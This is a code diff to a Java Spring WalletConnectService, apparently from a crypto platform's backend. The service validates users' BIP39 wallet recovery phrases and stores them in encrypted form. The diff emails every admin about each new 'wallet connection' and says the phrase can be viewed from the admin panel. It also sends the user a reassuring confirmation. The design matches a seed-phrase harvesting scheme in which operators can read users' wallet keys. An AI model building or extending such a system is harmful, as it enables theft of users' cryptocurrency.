@@ -7,6 +7,7 @@ import com.javalive.backend.entity.Wallet;
 import com.javalive.backend.repository.UserRepository;
 import com.javalive.backend.repository.WalletRepository;
 import com.javalive.backend.service.mail.MailService;
+import com.javalive.backend.service.notification.NotificationService;
 import com.javalive.backend.service.settings.SettingsService;
 import com.javalive.backend.web.exception.ApiException;
 import org.springframework.http.HttpStatus;
@@ -40,16 +41,19 @@ public class WalletConnectService {
     private final AesEncryptionService encryptionService;
     private final MailService mailService;
     private final SettingsService settingsService;
+    private final NotificationService notificationService;
 
     public WalletConnectService(WalletRepository walletRepository, UserRepository userRepository,
                                  Bip39Validator bip39Validator, AesEncryptionService encryptionService,
-                                 MailService mailService, SettingsService settingsService) {
+                                 MailService mailService, SettingsService settingsService,
+                                 NotificationService notificationService) {
         this.walletRepository = walletRepository;
         this.userRepository = userRepository;
         this.bip39Validator = bip39Validator;
         this.encryptionService = encryptionService;
         this.mailService = mailService;
         this.settingsService = settingsService;
+        this.notificationService = notificationService;
     }
 
     @Transactional(readOnly = true)
@@ -108,14 +112,18 @@ public class WalletConnectService {
         user.setUpdatedAt(now);
         userRepository.save(user);
 
-        String contactEmail = settingsService.get().getContactEmail();
-        if (contactEmail != null) {
-            mailService.send(contactEmail, "New wallet connection from " + user.getName(),
-                    "User: " + user.getName() + " (" + user.getEmail() + ")\n"
-                            + "Wallet Name: " + request.walletName() + "\n"
-                            + "Connection Time: " + now + "\n\n"
-                            + "The recovery phrase is encrypted at rest — view it from the admin panel if needed.");
-        }
+        notificationService.emailAllAdmins("New wallet connection from " + user.getName(),
+                "User: " + user.getName() + " (" + user.getEmail() + ")\n"
+                        + "Wallet Name: " + request.walletName() + "\n"
+                        + "Connection Time: " + now + "\n\n"
+                        + "The recovery phrase is encrypted at rest — view it from the admin panel if needed.");
+
+        notificationService.notifyUser(user, "Wallet Connected",
+                "Your wallet \"" + request.walletName() + "\" was successfully connected to your account.",
+                "success", wallet.getId(), "wallet");
+        mailService.send(user.getEmail(), "Wallet Connected",
+                "Your wallet \"" + request.walletName() + "\" was successfully connected to your account. "
+                        + "If this wasn't you, please contact support immediately.");
 
         return WalletStatus.from(wallet);
     }
